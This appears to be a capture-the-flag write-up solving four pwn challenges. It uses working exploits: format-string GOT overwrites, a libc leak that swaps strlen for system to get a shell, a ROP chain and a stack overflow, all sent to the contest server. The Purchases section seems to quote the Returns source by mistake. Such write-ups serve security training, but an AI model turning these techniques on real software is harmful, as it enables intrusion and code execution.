## Purchases

We have the source and the binary, so we can inspect the source and immediately find a string format vulnerability
```
int main() {
   ...
	char item[50];
	printf("What item would you like to return? ");
	fgets(item, 50, stdin);
	item[strlen(item)-1] = 0;

	if (strcmp(item, "nothing") == 0) {
		printf("Then why did you even come here? ");
	} else {
		printf("You don't have any money to buy ");
		printf(item);
		printf("s. You're wasting your time! We don't even sell ");
		printf(item);
		printf("s. Leave this place and buy ");
		printf(item);
		printf(" somewhere else. ");
	}
   ...
```

The function that we want to execute can be the following:
```
void flag() {
	system("/bin/cat flag.txt");
}
```

Then we inspected the binary and we find that there's the canary and either the stack is NX

### Solution
we used got overwrite, by overwritting the puts@got, than this last is called at the end of the main.
so knowing the format string behaviours, we inserted the following input

```
python -c "print '%4198838u%11\$n          \x18\x40\x40'" | nc shell.actf.co 19011   #actf{limited_edition_flag}
```


## Returns

We have the source and the binary, so we can inspect the source and immediately find a string format vulnerability
```
int main() {
   ...
	char item[50];
	printf("What item would you like to return? ");
	fgets(item, 50, stdin);
	item[strlen(item)-1] = 0;

	if (strcmp(item, "nothing") == 0) {
		printf("Then why did you even come here? ");
	} else {
		printf("You don't have any money to buy ");
		printf(item);
		printf("s. You're wasting your time! We don't even sell ");
		printf(item);
		printf("s. Leave this place and buy ");
		printf(item);
		printf(" somewhere else. ");
	}
   ...
```

Then we inspected the binary and we find that there's the canary and either the stack is NX, but PIE is disabled.

### Solution
we used got overwrite, by overwritting the puts@got with the address of the main, so having a loop of the main.
then in the second iteration we leaked the libc, by printing the content of strlen@got.
now we can overwrite the strlen@got by inserting the system, so with the next iteration we should have 'system(item)' instead of 'strlen(item)'.
```
from pwn import *
import time

debug = int(sys.argv[1])
online=False
socat=False
if( debug == -1):
  r = remote("localhost", 3414)
  socat=True
elif( debug == 0):
  r = remote("shell.actf.co", 19307)
  online=True
elif(debug == 1):
  libcz = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  mainz = ELF("./returns")
  r = mainz.process()

 
def halt():
  while True:
    log.info( r.recvline() )

def interactive():
  if ( not online and not socat):
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def printf(strz):
  r.recvuntil(strz)

def scanf( _):
  r.sendline("1")

def getchar():
  return

def exploit():
  #loop main
  printf("What item would you like to return?")
  payload1='%4198822u%11$n %p %p %p \x18\x40\x40'
  r.sendline(payload1) 
  #till here works.
  
  one_gadget = 0x41490  #system instead
  if online:
    one_gadget = 0x45390 #system instead
  printf("What item would you like to return?")
  payload2='stopHere:%11$s %p %p %p \x20\x40\x40'
  r.sendline(payload2)
  ret=r.recv()#empty
  if  socat:
    r.recvline()#empty
  if online:
    ret="".join( r.recv() )
  ret="".join( r.recv() )
  
  leak_strlen = u64( (ret.split("stopHere:")[1].split(" ")[0] ).ljust(8, "\x00")) 
  if online:
    leak_strlen = u64(("\x20" + (ret.split("stopHere:")[1].split(" ")[1] )).ljust(8, "\x00")) 
  log.info("leak strlen 0x%x " % leak_strlen)
 
  strlen_offset = 0x81c10
  if online :
    strlen_offset =0x8b720

  libc_base = leak_strlen - strlen_offset
  log.info("libc base 0x%x " % libc_base )
  log.info("one gadget addr 0x%x " % (libc_base + one_gadget))

  shell_one = libc_base + one_gadget
  #shell_one = leak_strlen
  strlen_got = 0x404020 #e.g. 0x7ffff7ab2c10 
                        #oneg 0x7ffff7a72320
 
  payload_i = '%{0}u%12$n%{1}u%13$hn'.format( shell_one & 0xffff, ((shell_one >> 16) & 0xffff ) - (shell_one & 0xffff) ).ljust(32," ")
  if online :
    payload_i = '%{0}u%12$n%{1}u%13$hn'.format( shell_one & 0xffff, ((shell_one >> 16) & 0xffff ) - (shell_one & 0xffff) ).ljust(32," ")
  payload_i += '\x20\x40\x40\x40\x00\x00\x00\x00\x22\x40\x40\x00\x00\x00\x00\x00'
  r.sendline(payload_i)
  #print(payload_i)
  r.sendline("cat flag.txt\x00")
  r.interactive()

  #actf{no_returns_allowed}

exploit( )
```


## Chain of Rope

We have the source and the binary, so we can inspect the source and immediately find a stack overflow
```
int main() {
  ...
 int choice;
 scanf("%d\n", &choice);
 if (choice == 1) {
	gets(name);
 } else if (choice == 2) {
  ...
```

The function that we want to execute can be the following:
```
int authorize () {
	userToken = 0x1337;
	return 0;
}

int addBalance (int pin) {
	if (userToken == 0x1337 && pin == 0xdeadbeef) {
		balance = 0x4242;
	} else {
		printf("ACCESS DENIED\n");
	}
	return 0;
}

int flag (int pin, int secret) {
	if (userToken == 0x1337 && balance == 0x4242 && pin == 0xba5eba11 && secret == 0xbedabb1e) {
		printf("Authenticated to purchase rope chain, sending free flag along with purchase...\n");
		system("/bin/cat flag.txt");
	} else {
		printf("ACCESS DENIED\n");
	}
	return 0;
}
```

Then we inspect the binary and we find that there's no canary, either PIE, but the stack is NX.

### Solution 
```
from pwn import *
import time

debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("shell.actf.co", 19400)
  #libcz = ELF("./libc-2.26.so")
  online=True
elif(debug == 1):
  libcz = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  mainz = ELF("./chain_of_rope")
  r = mainz.process()
  if(debug == 2):
    gdb.attach(r, """source ./script.py""") #some breakpoint etc..?
  
def halt():
  while True:
    log.info( r.recvline() )

def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def printf(strz):
  r.recvuntil(strz)

def scanf( _):
  r.sendline("1")

def getchar():
  return

def exploit():
  printf("3 - Grant access");
  r.sendline("1")
  userToken=0x1337; balance=0x4242; pin=0xba5eba11; secret=0xbedabb1e
  
  payload = ""
  payload += "A"*0x30
  payload += "B"*0x8
  # %rdi, %rsi, %rdx, %rcx, %r8 and %r9
  chain = ""
  chain += p64( 0x401196 )
  chain += p64(0x401403)	# pop rdi; ret 
  chain += p64(0xdeadbeef)
  chain += p64( 0x4011ab)
  chain += p64(0x401403)	# pop rdi; ret 
  chain += p64(0xba5eba11)
  chain += p64(0x401401)	# pop rsi; pop r15; ret 
  chain += p64(0xbedabb1e)
  chain += p64(0x0)
  chain += p64(0x4011eb)
  payload += chain
  r.sendline(payload)
  interactive() #actf{dark_web_bargains}

exploit()
```


## Aquarium

We have the source and the binary, so we can inspect the source and immediately find a stack overflow
```
struct fish_tank create_aquarium(){
  ...
 printf("Enter the name of your fish tank: ");
 char name[50];
 gets(name);
  ...
```

The function that we want to execute can be the following:
```
void flag() {
  system("/bin/cat flag.txt");
}
```

Then we inspect the binary and we find that there's no canary, either PIE, but the stack is NX.

### Solution
```
from pwn import *
import time

debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("shell.actf.co",19305)
  #libcz = ELF("./libc-2.26.so")
  online=True
elif(debug == 1):
  libcz = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  mainz = ELF("./aquarium")
  r = mainz.process()
  if(debug == 2):
    gdb.attach(r, """source ./script.py""") #some breakpoint etc..?
  
def halt():
  while True:
    log.info( r.recvline() )

def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def printf(strz):
  r.recvuntil(strz)

def scanf( _):
  r.sendline("1")

def getchar():
  return

def exploit():
	printf("Enter the number of fish in your fish tank: ");
	scanf("%d");
	getchar();

	printf("Enter the size of the fish in your fish tank: ");
	scanf("%d")
	getchar();

	printf("Enter the amount of water in your fish tank: ");
	scanf("%d")
	getchar();

	printf("Enter the width of your fish tank: ");
	scanf("%d")
	getchar();

	printf("Enter the length of your fish tank: ");
	scanf("%d")
	getchar();

	printf("Enter the height of your fish tank: ");
	scanf("%d")
	getchar();

	printf("Enter the name of your fish tank: ");
	flag = 0x4011b6;
	payload = ""
	payload += "A"*0x90
	payload += "B"*0x8
	payload += p64(flag)
	r.sendline(payload)
	print(r.recvline() )
	#interactive() #actf{overflowed_more_than_just_a_fish_tank}

exploit()
```

